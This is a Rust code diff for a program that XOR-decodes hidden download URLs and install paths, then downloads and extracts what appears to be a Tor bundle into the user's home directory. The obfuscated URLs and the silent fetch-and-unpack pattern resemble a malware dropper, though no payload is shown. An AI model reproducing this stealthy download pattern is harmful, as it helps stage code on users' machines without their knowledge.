@@ -3,10 +3,8 @@ mod xor;
 mod setting;
 
 use std::fs::File;
+use std::path::PathBuf;
 use std::{io, thread, time, error};
-
-use config::ENC_KEY;
-use config::ENC_WINDOWS_URL;
 
 fn main() {
     let setting: setting::Setting = load_settings();
@@ -43,31 +41,62 @@ fn download_and_extract_tor(setting: &setting::Setting) -> Result<(), Box<dyn er
         thread::sleep(sleep_time);
     };
 
+    std::fs::create_dir_all(&setting.linux_path)?;
+
+    let mut zip = zip::ZipArchive::new(file)?;
+    zip.extract(&setting.linux_path)?;
+
     Ok(())
 }
 
 fn load_settings() -> setting::Setting {
-    let key = String::from(ENC_KEY); 
+    let key = String::from(config::ENC_KEY); 
 
     let windows_url = xor::decode(
         &key, 
-        &String::from(ENC_WINDOWS_URL)
+        &String::from(config::ENC_WINDOWS_URL)
     ).unwrap_or_else(|_| {
         panic!("problem unserializing windows url");
     });
 
     let linux_url = xor::decode(
         &key,
-        &String::from(ENC_WINDOWS_URL)
+        &String::from(config::ENC_LINUX_URL)
     ).unwrap_or_else(|_| {
         panic!("problem unserializing linux url");
+    });
+
+    let windows_path = xor::decode(
+        &key,
+        &String::from(config::ENC_WINDOWS_PATH)
+    ).unwrap_or_else(|_| {
+        panic!("problem unserializing windows path");
+    });
+
+    let linux_path = xor::decode(
+        &key,
+        &String::from(config::ENC_LINUX_PATH)
+    ).unwrap_or_else(|_| {
+        panic!("problem unserializing linux path");
     });
 
     setting::Setting {
         key,
         windows_url,
-        linux_url
+        linux_url,
+        windows_path: expand_user_dir(&windows_path),
+        linux_path: expand_user_dir(&linux_path)
     }
+}
+
+fn expand_user_dir(path: &String) -> PathBuf {
+    let mut home_dir = match dirs::home_dir() {
+        Some(d) => d,
+        None => panic!("problem finding home user directory")
+    };
+
+    home_dir.push(PathBuf::from(path));
+    home_dir
 }
 
 fn download(url: &String, out_file: &mut File) -> Result<(), ureq::Error> {
